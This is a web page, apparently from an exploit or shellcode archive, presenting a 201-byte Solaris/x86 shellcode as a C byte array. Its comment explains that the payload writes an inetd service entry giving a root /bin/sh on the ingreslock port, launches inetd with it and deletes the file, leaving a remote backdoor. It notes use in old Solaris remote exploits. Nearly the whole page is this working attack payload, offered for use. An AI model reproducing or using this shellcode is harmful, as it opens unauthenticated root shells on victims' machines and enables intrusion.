<html><head><title>Solaris/x86 - add services and execve inetd - 201 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 *  Solaris/x86
 *
 *  Just execve()'s the following:
 *   &quot;echo \&quot;ingreslock stream tcp nowait root /bin/sh sh -i\&quot;&gt;/tmp/x;&quot;
 *   &quot;/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x&quot;;
 *
 *  for a trivial remote bd. Used in a few old Solaris/x86 remote exploits. 
 */
 
char c0de[] =
&quot;\xeb\x3d\x9a\x24\x24\x24\x24\x07\x24\xc3\x5e\x29\xc0\x89\x46\xbf\x88\x46\xc4&quot;
&quot;\x89\x46\x0c\x88\x46\x17\x88\x46\x1a\x88\x46\x78\x29\xc0\x50\x56\x8d\x5e\x10&quot;
&quot;\x89\x1e\x53\x8d\x5e\x18\x89\x5e\x04\x8d\x5e\x1b\x89\x5e\x08\xb0\x3b\xe8\xc6&quot;
&quot;\xff\xff\xff\xff\xff\xff\xe8\xc6\xff\xff\xff\x01\x01\x01\x01\x02\x02\x02\x02&quot;
&quot;\x03\x03\x03\x03\x04\x04\x04\x04&quot;
&quot;\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x63\x20&quot;
&quot;echo \&quot;ingreslock stream tcp nowait root /bin/sh sh -i\&quot;&gt;/tmp/x;&quot;
&quot;/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x&quot;;

/* EOF */


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
